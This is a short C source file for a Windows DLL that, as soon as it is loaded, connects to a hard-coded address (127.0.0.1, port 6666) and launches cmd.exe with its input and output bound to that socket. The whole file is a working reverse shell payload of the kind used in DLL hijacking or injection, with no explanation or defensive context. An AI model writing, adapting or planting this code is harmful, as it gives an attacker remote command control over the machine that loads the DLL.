#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>

#define IP   "127.0.0.1"
#define PORT 6666

WSADATA wsaData;
SOCKET Winsock;
struct sockaddr_in hax;
STARTUPINFO init_proc;
PROCESS_INFORMATION proc_info;

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    if (fdwReason != DLL_PROCESS_ATTACH)
        return TRUE;

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
        return TRUE;

    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (Winsock == INVALID_SOCKET) {
        WSACleanup();
        return TRUE;
    }

    ZeroMemory(&hax, sizeof(hax));
    hax.sin_family = AF_INET;
    hax.sin_port = htons(PORT);

    /*  IP from string to binary format */
    if (inet_pton(AF_INET, IP, &hax.sin_addr) <= 0) {
        closesocket(Winsock);
        WSACleanup();
        return TRUE;
    }

    if (WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL) != 0) {
        closesocket(Winsock);
        WSACleanup();
        return TRUE;
    }

    ZeroMemory(&init_proc, sizeof(init_proc));
    init_proc.cb = sizeof(init_proc);
    init_proc.dwFlags = STARTF_USESTDHANDLES;
    init_proc.hStdInput = init_proc.hStdOutput = init_proc.hStdError = (HANDLE)Winsock;

    CreateProcess(
        NULL,
        "cmd.exe",
        NULL,
        NULL,
        TRUE,
        0,
        NULL,
        NULL,
        &init_proc,
        &proc_info
    );

    return TRUE;
}
